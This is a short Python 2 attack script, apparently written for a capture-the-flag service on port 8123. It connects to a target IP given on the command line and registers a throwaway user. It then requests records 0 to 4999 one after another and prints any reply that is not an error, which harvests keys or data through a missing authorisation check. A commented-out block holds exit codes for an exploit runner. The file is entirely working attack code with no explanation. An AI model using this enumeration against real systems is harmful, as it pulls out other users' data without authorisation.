#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import random
import time
import socket

tip = sys.argv[1]
print 'tip: ' + tip
tport = 8123

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((tip, tport))


s.sendall('register a a\r\n')
key = s.recv(1024)
for i in range(0, 5000):
  sc = 'get ' + str(i) + '\r\n'
  s.sendall(sc)
  key = s.recv(1024)
  if key[0] == 'E':
    continue
  else:
    print key
sys.exit(0)

#exploit
#if len(key) > 5:
  #on success
#  print key
#  sys.exit(0)
#else:
#  #on fail
#  sys.exit(1)
